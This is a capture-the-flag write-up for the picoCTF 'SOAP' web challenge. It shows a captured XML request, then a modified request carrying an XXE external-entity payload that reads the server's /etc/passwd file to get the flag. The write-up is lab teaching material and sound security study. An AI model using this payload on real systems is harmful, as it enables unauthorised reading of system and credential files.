# Challange Info

Name : SOAP

Difficulty : Medium

Category : Web Exploitation

Link : https://play.picoctf.org/practice/challenge/376?category=1&page=2

# Writeup

Navigating the webapp.

There are three buttons which shows details on webapp.

Capturing one of the detail request and send it to repeater.

```
POST /data HTTP/1.1

Host: saturn.picoctf.net:62138

Content-Length: 61

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36

Content-Type: application/xml

Accept: */*

Origin: http://saturn.picoctf.net:62138

Referer: http://saturn.picoctf.net:62138/

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

sec-gpc: 1

Connection: keep-alive

<?xml version="1.0" encoding="UTF-8"?>
  <data>
    <ID>
      1
    </ID>
  </data>
```

The data is sent via xml which can lead to XXE and description says we need to read /etc/passwd file so we modify the request.

```
POST /data HTTP/1.1

Host: saturn.picoctf.net:62138

Content-Length: 142

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36

Content-Type: application/xml

Accept: */*

Origin: http://saturn.picoctf.net:61871

Referer: http://saturn.picoctf.net:61871/

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

sec-gpc: 1

Connection: keep-alive

<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE replace [<!ENTITY file SYSTEM"file:///etc/passwd">]>
  <data>
    <ID>
      &file;
    </ID>
  </data>
```

This will display the /etc/passwd file from the server which contains the flag.
